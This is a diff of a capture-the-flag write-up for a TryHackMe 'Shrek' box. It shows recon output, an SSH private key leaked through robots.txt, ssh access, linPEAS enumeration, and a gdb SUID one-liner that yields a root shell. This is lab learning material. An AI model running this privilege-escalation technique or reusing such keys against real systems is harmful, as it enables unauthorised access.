@@ -1,10 +1,10 @@
-# Shrek [6.9.2020][TryHackMe]
+# Vincent's Shrek KOTH writeup
 
 ## Recon
 
 ### nmap
 
-```
+```text
 PORT     STATE SERVICE VERSION
 21/tcp   open  ftp     vsftpd 3.0.2
 22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
@@ -17,7 +17,7 @@ PORT     STATE SERVICE VERSION
 
 ### gobuster
 
-```
+```text
 /upload (Status: 301)
 /cms (Status: 301)
 /api (Status: 301)
@@ -28,14 +28,14 @@ PORT     STATE SERVICE VERSION
 
 ### shrek.thm/robots.txt
 
-```
+```text
 User-agent: *
 Disallow: /Cpxtpt2hWCee9VFa.txt
 ```
 
 #### /Cpxtpt2hWCee9VFa.txt
 
-```
+```text
 -----BEGIN RSA PRIVATE KEY-----
 MIIEogIBAAKCAQEAsKHyvIOqmETYwUvLDAWg4ZXHb/oTgk7A4vkUY1AZC0S6fzNE
 JmewL2ZJ6ioyCXhFmvlA7GC9iMJp13L5a6qeRiQEVwp6M5AYYsm/fTWXZuA2Qf4z
@@ -67,7 +67,7 @@ Q2FZnCyRqaHlYUKWwZBt2UYbC46sfCWapormgwo3xA8Ix/jrBBI=
 
 ### ssh2john.py
 
-```
+```text
 # python3 ssh2john.py /home/kali/key.pem
 ssh2john.py:103: DeprecationWarning: decodestring() is a deprecated alias since Python 3.1, use decodebytes()
   data = base64.decodestring(data)
@@ -80,10 +80,10 @@ Here we can see that there is no password for the ssh key.
 
 Took a random guess because it's called Shrek.
 
-```
+```text
 # ssh -i key.pem shrek@shrek.thm
 Last login: Tue Jun  9 23:03:29 2020 from ip-10-1-122-133.eu-west-1.compute.internal
-[shrek@shrek ~]$ 
+[shrek@shrek ~]$
 ```
 
 ### ls
@@ -97,7 +97,7 @@ check.sh  flag.txt
 
 From here I downloaded linPEAS from github to find any vulnerabilities.
 
-```
+```text
 # git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite.git
 ```
 
@@ -105,13 +105,13 @@ From here I downloaded linPEAS from github to find any vulnerabilities.
 
 I needed to get this file onto here
 
-```
+```text
 # scp -i key.pem linpeas.sh shrek@shrek.thm:/home/shrek
 ```
 
 Afterwards it looked like this:
 
-```
+```text
 $ ls
 check.sh  flag.txt  linpeas.sh
 ```
@@ -123,20 +123,20 @@ $ sh linpeas.sh
 ====================================( Interesting Files )=====================================
 [+] SUID - Check easy privesc, exploits and write perms
 [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
-/usr/bin/chfn		--->	SuSE_9.3/10
+/usr/bin/chfn        --->    SuSE_9.3/10
 /usr/bin/chsh
-/usr/bin/mount		--->	Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+/usr/bin/mount        --->    Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
 /usr/bin/chage
 /usr/bin/gpasswd
-/usr/bin/newgrp		--->	HP-UX_10.20
+/usr/bin/newgrp        --->    HP-UX_10.20
 /usr/bin/su
-/usr/bin/umount		--->	BSD/Linux(08-1996)
-/usr/bin/sudo		--->	/sudo$
-/usr/bin/pkexec		--->	Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
+/usr/bin/umount        --->    BSD/Linux(08-1996)
+/usr/bin/sudo        --->    /sudo$
+/usr/bin/pkexec        --->    Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
 /usr/bin/gdb
 /usr/bin/crontab
 /usr/bin/run-parts
-/usr/bin/passwd		--->	Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+/usr/bin/passwd        --->    Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
 /usr/sbin/pam_timestamp_check
 /usr/sbin/unix_chkpwd
 /usr/sbin/usernetctl
@@ -161,13 +161,13 @@ You can't see it here, but the most interesting part was gdb.
 
 After looking on GTFObins, you can find this gdb privilege escalation:
 
-```
+```text
 gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
 ```
 
 Here's the result:
 
-```
+```text
 [shrek@shrek ~]$ gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
 GNU gdb (GDB) Red Hat Enterprise Linux 7.6.1-115.el7
 Copyright (C) 2013 Free Software Foundation, Inc.
@@ -178,7 +178,8 @@ and "show warranty" for details.
 This GDB was configured as "x86_64-redhat-linux-gnu".
 For bug reporting instructions, please see:
 <http://www.gnu.org/software/gdb/bugs/>.
-sh-4.2# 
+sh-4.2#
 ```
 
 From here we can find all the flags and defend the title.
+
